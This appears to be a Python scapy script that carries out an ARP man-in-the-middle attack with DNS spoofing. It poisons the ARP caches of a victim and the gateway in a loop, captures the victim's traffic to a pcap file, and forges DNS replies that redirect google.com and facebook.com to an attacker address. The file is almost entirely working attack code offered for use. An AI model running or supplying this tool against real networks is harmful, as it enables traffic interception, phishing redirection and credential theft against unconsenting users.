# Packages
import scapy.all as scapy
import sys, time, multiprocessing
import netifaces as ni


# Constants
DIVIDER = '=' * 60
POISON_BREAK = 30
SPOOF_DOMAIN_NAME = 'www.google.com'
REDIRECT_IP = '192.168.56.102'

# DNS Spoofing targets
dns_hosts = {
    b"www.google.com.": "10.0.2.6",
    b"google.com.": "10.0.2.6",
    b"facebook.com.": "10.0.2.6"
}

# ARP Man in the Middle DNS Spoofing Attack
class ARPMITMDNSSpoofing():
    # Constructs the ARP Man in the Middle DNS Spoofing Attack
    def __init__(self, victimIP, interface):
        # Disables verbosity (command line) mode
        scapy.conf.verb = 0
        
        # Assign default scapy interface
        scapy.conf.iface = interface

        # Assign targets
        self.victimIP = victimIP
        self.interface = interface
        self.routerIP = scapy.conf.route.route('0.0.0.0')[2] # Gateway ip address

        # Assign macAddresses
        self.victimMac = scapy.getmacbyip(victimIP)
        if not self.victimMac: # If victim MAC not found
            raise ValueError("Cannot find MAC address for victim IP: {}".format(victimIP))

        self.routerMac = scapy.getmacbyip(self.routerIP)
        if not self.routerMac: # If router MAC not found
            raise ValueError("Cannot find MAC address for router IP: {}".format(self.routerIP))

        self.deviceMac = scapy.get_if_hwaddr(interface)

    # Returns interactive prompt string
    def __repr__(self):
        return 'ARPMITMDNSPoisoning({}, {})'.format(self.victimIP, self.interface)

    # Returns string representation
    def __str__(self):
        return 'ARP Man in the Middle DNS Poisoning on {}:\n - Victim IP {} at {}'.format(
                self.interface, self.victimIP, self.victimMac)

    # Print Initialization Message
    def printInitializationMessage(self):
        print('{divider}\nRunning {str}\n{divider}'.format(divider = DIVIDER, str = self))
        print('Press [CTRL-C] to stop the ARP/DNS Poisoning and clean the ARP tables of the victims')

    # Execute the attack
    def execute(self):
        # Print initialization message
        self.printInitializationMessage()

        # Setup packets
        # ARP Poisoning packet for victim one
        victimPoisonPacket = scapy.ARP(hwsrc = self.deviceMac,
                           psrc = self.routerIP,
                           pdst = self.victimIP, 
                           hwdst = self.victimMac)

        # ARP Poisoning packet for victim two
        routerPoisonPacket = scapy.ARP(hwsrc = self.deviceMac,
                            psrc = self.victimIP,
                            pdst = self.routerIP,
                            hwdst = self.routerMac)

        # Sniffing process
        sniffingIncomingPacketsProcess = multiprocessing.Process(target = self.sniffIncomingPackets)

        # Start sniffing process
        sniffingIncomingPacketsProcess.start()

        # Infinitely poisons the victims
        while True:
            try: # Send poison packets
                scapy.send(victimPoisonPacket)
                scapy.send(routerPoisonPacket)
                time.sleep(POISON_BREAK)
            except KeyboardInterrupt: # CTRL-C was pressed
                sniffingIncomingPacketsProcess.join() # Wait for the packet sniffing to stop
                self.clean() # Cleaning ARP tables of the victims
                break # Stop the poisoning-loop

    # Sniffs incoming packets
    def sniffIncomingPackets(self):
        bpfFilter = 'ip host {}'.format(self.victimIP) 
        incomingPackets = scapy.sniff(filter = bpfFilter, prn = self.dnsSpoof)
        #storing all packets in a pcap file
        scapy.wrpcap('captured_packets.pcap', incomingPackets)

    # DNS spoof packets
    # DNS spoof packets
    def dnsSpoof(self, packet):
        if packet.haslayer(scapy.IP) and packet.haslayer(scapy.DNSQR):
            source_dest = packet[scapy.IP].src
            if source_dest == self.victimIP and packet[scapy.DNSQR].qname in dns_hosts:
                if packet.haslayer(scapy.DNS):
                    # Construct a new packet
                    new_packet = scapy.Ether(src=packet[scapy.Ether].dst, dst=packet[scapy.Ether].src) / \
                                scapy.IP(dst=packet[scapy.IP].src, src=packet[scapy.IP].dst) / \
                                scapy.UDP(dport=packet[scapy.UDP].sport, sport=packet[scapy.UDP].dport) / \
                                scapy.DNS(id=packet[scapy.DNS].id, qd=packet[scapy.DNS].qd, aa=1, qr=1,
                                        an=scapy.DNSRR(rrname=packet[scapy.DNS].qd.qname, type='A', ttl=624,
                                                        rdata=dns_hosts[packet[scapy.DNSQR].qname]))

                    scapy.sendp(new_packet, iface=self.interface)
                    print("DNS packet was sent with: " + new_packet.summary() + " to ip: " + new_packet[scapy.IP].dst)
                else:
                    if packet.haslayer(scapy.IP):
                        del packet[scapy.IP].len
                        del packet[scapy.IP].chksum

                    if packet.haslayer(scapy.UDP):
                        del packet[scapy.UDP].len
                        del packet[scapy.UDP].chksum

                    scapy.send(packet)



    # Clean ARP tables of the victims
    def clean(self):
        # Clean victim one's ARP Table
        scapy.send(scapy.ARP(
            op=2,
            psrc=self.routerIP,
            hwsrc=self.routerMac,
            pdst=self.victimIP,
            hwdst="ff:ff:ff:ff:ff:ff"), count=5)
        # Clean victim two's ARP Table
        scapy.send(scapy.ARP(
            op=2,
            psrc=self.victimIP,
            hwsrc=self.victimMac,
            pdst=self.routerIP,
            hwdst="ff:ff:ff:ff:ff:ff"), count=5)
    #check if the posioning was sucessful
    def check_arp_poisoning(self):
        # Send an ICMP echo request (ping) to the victim
        icmp = scapy.IP(dst=self.victimIP)/scapy.ICMP()
        response = scapy.sr1(icmp, timeout=2, verbose=0)

        if response is not None and response.src == self.victimIP and response[scapy.ICMP].type == 0:
            # We received an ICMP echo reply from the victim
            print("ARP poisoning appears to be successful")
        else:
            # We didn't receive a reply, or the reply wasn't what we expected
            print("ARP poisoning may not have been successful")